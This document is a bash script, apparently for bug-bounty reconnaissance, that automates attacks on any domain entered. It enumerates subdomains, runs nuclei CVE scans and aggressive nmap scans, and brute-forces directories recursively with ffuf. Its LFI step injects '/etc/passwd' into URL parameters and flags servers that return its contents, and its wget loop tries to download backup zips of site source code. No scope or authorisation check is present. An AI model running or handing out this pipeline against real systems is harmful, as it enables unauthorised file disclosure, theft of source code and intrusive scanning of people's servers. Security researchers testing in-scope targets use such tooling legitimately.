#!/usr/bin/bash
# Bug Bounty Automation - Recon

read -p 'Enter domain name (e.g google.com): ' domain

declare -a dirs=($domain
    "$domain/port_scans"
    "$domain/source_code/"
    "$domain/directories_small"
    "$domain/directories_big"
    "$domain/directories_recursive_small"
    "$domain/directories_recursive_big"
    "$domain/screenshots"
    "$domain/lfi"
    "$domain/CVEs"
    "$domain/wayback_urls"
    "$domain/technologies")

for i in "${dirs[@]}"; do
    if [ ! -d "$i" ]; then
        mkdir -p $i
    fi
done

# Amass
echo -e "\n\n\n[+] Launching Amass ...\n\n\n"
amass enum --passive -d $domain | tee "$domain"/all_subdomains.txt

{
    if [ ! -f "$domain"/all_subdomains.txt ]; then
        echo "Did not Get subdomains, Bye!.."
        exit 0
    fi
}

# Probing for HTTP/HTTPs
echo -e "\n\n\n[+] Probing for HTTP/HTTPs ...\n\n\n"
cat "$domain"/all_subdomains.txt | ~/go/bin/httprobe --prefer-https | tee "$domain"/subdomains_with_http_https.txt
{
    if [ ! -f "$domain"/subdomains_with_http_https.txt ]; then
        echo "Did not Probe, Bye!.."
        exit 0
    fi
}
cat "$domain"/subdomains_with_http_https.txt | awk -F "//" '{print $2}' >"$domain"/alive.txt

# Wayback URLs
echo -e "\n\n\n[+] Obtaining wayback URLs...\n\n\n"
for n in $(cat "$domain"/subdomains_with_http_https.txt); do
    echo "$n" | ~/go/bin/waybackurls | tee -a "$domain"/wayback_urls/$(echo $n | awk -F "//" '{print $2}')
done

# Screenshots
echo -e "\n\n\n[+] Obtaining Screenshots...\n\n\n"
cat "$domain"/subdomains_with_http_https.txt | aquatone
mv screenshots/* "$domain/screenshots"
rm -rf html/ headers/ screenshots/ aquatone_urls.txt aquatone_report.html

# Technologies
echo -e "\n\n\n[+] Getting Technologies ...\n\n\n"
~/go/bin/webanalyze -update
for o in $(cat "$domain"/subdomains_with_http_https.txt); do
    ~/go/bin/webanalyze -host "$o" -crawl 1 | tee "$domain"/technologies/$(echo $o | awk -F "//" '{print $2}')
done
rm technologies.json

# Hunting CVEs
echo -e "\n\n\n[+] Hunting CVEs ...\n\n\n"
for k in $(cat "$domain"/subdomains_with_http_https.txt); do
    ~/go/bin/nuclei -u "$k" -o "$domain"/CVEs/$(echo $k | awk -F "//" '{print $2}')
done

# LFI
echo -e "\n\n\n[+] Hunting for LFI ...\n\n\n"
for r in $(cat "$domain"/alive.txt); do
    gau $r | gf lfi | qsreplace "/etc/passwd" | sed "s/'\|(\|)//g" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x:0" && echo "VULN! %"' | tee -a "$domain"/lfi/$(echo $r)

done

# JEx
echo -e "\n\n\n[+] Hunting for LFI ...\n\n\n"
python3 /opt/jex/JEx.py $(pwd)/"$domain"/alive.txt

# Backup files
echo -e "\n\n\n[+] Downloading Backup files...\n\n\n"
for p in $(cat "$domain"/subdomains_with_http_https.txt | grep -v www); do
    back=$(echo "$p" | awk -F '//' '{print $2}' | awk -F '.' '{print $1}')
    wget $p/$back.zip -t 1 --no-check-certificate --timeout=10 -O "$domain"/source_code/$back.zip
    wget $p/$(echo $p | awk -F "//" '{print $2}').zip -t 1 --no-check-certificate --timeout=10 -O "$domain"/source_code/$(echo $p | awk -F "//" '{print $2}').zip
    wget $p/backup.zip -t 1 --no-check-certificate --timeout=10 -O "$domain"/source_code/$(echo $p | awk -F "//" '{print $2}')-backup.zip

done

# Scanning open ports
echo -e "\n\n\n[+] Scanning open Ports...\n\n\n"
for l in $(cat "$domain"/alive.txt); do
    nmap -A $l -o "$domain"/port_scans/$l
done

# Bruteforcing Directories
echo -e "\n\n\n[+] Bruteforcing Directories...\n\n\n"
for j in $(cat "$domain"/subdomains_with_http_https.txt); do
    ~/go/bin/ffuf -w /opt/wordlists/dicc.txt -u $j/FUZZ -c | tee -a "$domain"/directories_small/$(echo $j | awk -F "//" '{print $2}')

done

# Bruteforcing Directories Recursively Samll
echo -e "\n\n\n[+] Bruteforcing Directories Recursively...\n\n\n"
for p in $(cat "$domain"/subdomains_with_http_https.txt); do
    ~/go/bin/ffuf -w /opt/wordlists/dicc.txt -u $p/FUZZ -c -recursion -recursion-depth 10 | tee -a "$domain"/directories_recursive_small/$(echo $p | awk -F "//" '{print $2}')
done

# Bruteforcing Directories with Large Worldlist
echo -e "\n\n\n[+] Bruteforcing Directories with Large Worldlist...\n\n\n"
for m in $(cat "$domain"/subdomains_with_http_https.txt); do
    ~/go/bin/ffuf -w /opt/wordlists/directory-list-2.3-medium.txt -u $m/FUZZ -c | tee -a "$domain"/directories_big/$(echo $m | awk -F "//" '{print $2}')
done

# Bruteforcing Directories Recursively Big
echo -e "\n\n\n[+] Bruteforcing Directories with Large Worldlist...\n\n\n"
for q in $(cat "$domain"/subdomains_with_http_https.txt); do
    ~/go/bin/ffuf -w /opt/wordlists/directory-list-2.3-medium.txt -u $q/FUZZ -c -recursion -recursion-depth 10 | tee -a "$domain"/directories_recursive_big/$(echo $q | awk -F "//" '{print $2}')
done

echo -e "\n\n\n Done!!..... \n\n\n"

# Matching
# str=$1
# for i in $(grep -rl $str); do

#     match=$(cat $i | grep 200 | grep -v 147711 | grep -v 171387 | grep -v 149 | grep -v 3188 | grep -v 3827 | grep -v "Size: 0" | grep $str | awk '{print $1}')
#     if [[ "$match" == *"$str"* ]]; then
#         echo "$match $i"
#     fi

# done
